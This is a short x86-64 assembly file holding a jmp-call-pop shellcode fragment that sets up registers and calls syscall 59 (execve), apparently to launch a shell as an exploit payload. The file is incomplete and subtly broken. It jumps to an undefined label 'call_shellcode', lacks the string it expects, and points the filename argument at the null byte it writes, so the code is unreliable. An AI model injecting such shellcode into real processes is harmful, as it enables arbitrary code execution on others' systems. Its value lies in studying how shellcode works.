segment .text
    global _start

_start:
    jmp call_shellcode

shellcode:

    pop rbx
    xor rax, rax

    mov [rbx+7], al
    mov [rbx+8], rbx
    mov [rbx+16], rax

    mov al, 59
    lea rdi, [rbx+7]
    lea rsi, [rbx+8]
    lea rdx, [rbx+16]

    syscall
